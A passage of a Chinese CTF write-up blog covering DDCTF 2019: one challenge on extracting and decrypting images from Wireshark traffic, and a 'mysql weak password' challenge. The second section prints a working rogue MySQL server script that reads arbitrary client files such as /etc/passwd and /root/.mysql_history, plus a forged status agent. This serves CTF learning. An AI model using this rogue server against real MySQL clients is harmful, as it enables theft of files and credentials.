<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>这个题也比较简单，上来先wireshark过滤出来http协议的流量，我们可以清楚的看到，出题者先给了一个原始图片，又到了一个加密网站上将图片加密了。<br>首先我们可以看到，加密网站为tools.jb51.net<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9eed02043e89b27a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9eed02043e89b27a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>这里我们可以不用wireshark提取图片，推荐大家一个软件，叫作Omnipeek，我们安装最新版的，可以直接看到流量包里包含的各种文件。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-666745dd1d7f0aff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-666745dd1d7f0aff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们最终提取出三个图片(有两个图我是在Ubuntu下用foremost提取的)，一个钥匙图，一个原图，一个加密图。钥匙图我们修改图片的高度，可以看到加密用到的密钥。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-f25214ae8963f480.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-f25214ae8963f480.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后我们进行解密<br><img src="https://upload-images.jianshu.io/upload_images/11234137-0899e364204c5eca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-0899e364204c5eca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>我们将中间的hex码转码成明文，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-247168ff7a9e2445.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-247168ff7a9e2445.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}</p>
</blockquote>
<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>这一道题是复现出来的，后来才知道是寒假hgame的一道题，但是当时好像是最后一周的比赛，因为家里有点事情所以就没打，后悔莫及啊。。。这一个题是19年一个cve改的，感觉ctf题目越来越新颖，从最初的考察基本知识点，或者几个知识点串在一起，变得更加贴近实战(当然也越来越难了)，不扯多了，开始复现<br><img src="https://upload-images.jianshu.io/upload_images/11234137-d4cd6fd0ea82bb11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d4cd6fd0ea82bb11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>拿到题第一个想法，这啥意思？我在哪里？首先做这个题，得有一个vps，在vps上python运行题目给的agent.php。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 12/1/2019 2:58 PM</span></span><br><span class="line"><span class="comment"># @Author  : fz</span></span><br><span class="line"><span class="comment"># @Site    : </span></span><br><span class="line"><span class="comment"># @File    : agent.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"\n----- Request Start -----&gt;\n"</span>)</span><br><span class="line">        print(<span class="string">"request_path :"</span>, request_path)</span><br><span class="line">        print(<span class="string">"self.headers :"</span>, self.headers)</span><br><span class="line">        print(<span class="string">"&lt;----- Request End -----\n"</span>)</span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">"Set-Cookie"</span>, <span class="string">"foo=bar"</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">        result = self._func()</span><br><span class="line">        self.wfile.write(json.dumps(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span><span class="params">(self)</span>:</span></span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print("\n----- Request Start -----&gt;\n")</span></span><br><span class="line">        print(<span class="string">"request_path : %s"</span>, request_path)</span><br><span class="line"></span><br><span class="line">        request_headers = self.headers</span><br><span class="line">        content_length = request_headers.getheaders(<span class="string">'content-length'</span>)</span><br><span class="line">        length = int(content_length[<span class="number">0</span>]) <span class="keyword">if</span> content_length <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print("length :", length)</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"request_headers : %s"</span> % request_headers)</span><br><span class="line">        print(<span class="string">"content : %s"</span> % self.rfile.read(length))</span><br><span class="line">        <span class="comment"># print("&lt;----- Request End -----\n")</span></span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">"Set-Cookie"</span>, <span class="string">"foo=bar"</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        result = self._func()</span><br><span class="line">        self.wfile.write(json.dumps(result))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_func</span><span class="params">(self)</span>:</span></span><br><span class="line">        netstat = Popen([<span class="string">'netstat'</span>, <span class="string">'-tlnp'</span>], stdout=PIPE)</span><br><span class="line">        netstat.wait()</span><br><span class="line"></span><br><span class="line">        ps_list = netstat.stdout.readlines()</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> ps_list[<span class="number">2</span>:]:</span><br><span class="line">            tmp = item.split()</span><br><span class="line">            Local_Address = tmp[<span class="number">3</span>]</span><br><span class="line">            Process_name = tmp[<span class="number">6</span>]</span><br><span class="line">            tmp_dic = &#123;<span class="string">'local_address'</span>: Local_Address, <span class="string">'Process_name'</span>: Process_name&#125;</span><br><span class="line">            result.append(tmp_dic)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    do_PUT = do_POST</span><br><span class="line">    do_DELETE = do_GET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    port = <span class="number">8123</span></span><br><span class="line">    print(<span class="string">'Listening on localhost:%s'</span> % port)</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, port), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.usage = (</span><br><span class="line">        <span class="string">"Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n"</span></span><br><span class="line">        <span class="string">"Run:\n\n"</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>agent.py的意思是，调用服务器的8123端口来验证服务器是否运行了mysql进程，然后调用命令进行验证，具体的函数体现在_func(self)这一个函数里面，所以我们可以直接改动这个函数，让他返回的result为{‘local_address’:”0.0.0.0:3306”, ‘Process_name’:”1234/mysqld”}，这样就可以伪造出服务器运行了mysql。然后我们需要用到的，是一个github上面的工具，<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">链接在此</a></p>
<p>然后我们在其中运行里面的py文件就可以在终端看到我们想要看到的内容，我将py文件名字改为x.py，x.py文件内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>我们在自己的vps上同时运行修改过的agent.py和这一个x.py文件，就可读到文件内容，需要读的文件，要在这个py文件的filename变量中修改。具体得到flag的操作如下</p>
<p>首先在服务器上用python运行修改过的agent.py和x.py,然后再将filename改为/root/.mysql_history，然后在题目网址上填写我们的vps地址和端口，即可得到flag</p>
<p><img src="https://upload-images.jianshu.io/upload_images/11234137-5c6139f7f56fa01b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5c6139f7f56fa01b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>部署x.py</p>
<p><img src="https://upload-images.jianshu.io/upload_images/11234137-6fe41c981485c615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-6fe41c981485c615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>网址上需要输入的是vps和端口</p>
<p><img src="https://upload-images.jianshu.io/upload_images/11234137-2f44b61619728795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-2f44b61619728795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/03/28/安恒杯西湖论剑/" rel="next" title="安恒杯西湖论剑wp">
                <i class="fa fa-chevron-left"></i> 安恒杯西湖论剑wp
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/27/2019国赛部分题目WP---NEX的小老妹/" rel="prev" title="2019国赛部分题目wp-by NEX">
                2019国赛部分题目wp-by NEX <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
            
              <p class="site-author-name" itemprop="name">Bling_Dog</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#滴"><span class="nav-number">1.1.</span> <span class="nav-text">滴~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web签到题"><span class="nav-number">1.2.</span> <span class="nav-text">web签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload-IMG"><span class="nav-number">1.3.</span> <span class="nav-text">Upload-IMG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#大吉大利，今晚吃鸡"><span class="nav-number">1.4.</span> <span class="nav-text">大吉大利，今晚吃鸡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MulTzor"><span class="nav-number">1.5.</span> <span class="nav-text">MulTzor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wireshark"><span class="nav-number">1.6.</span> <span class="nav-text">Wireshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql弱口令"><span class="nav-number">1.7.</span> <span class="nav-text">mysql弱口令</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>
  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/click.js"></script>

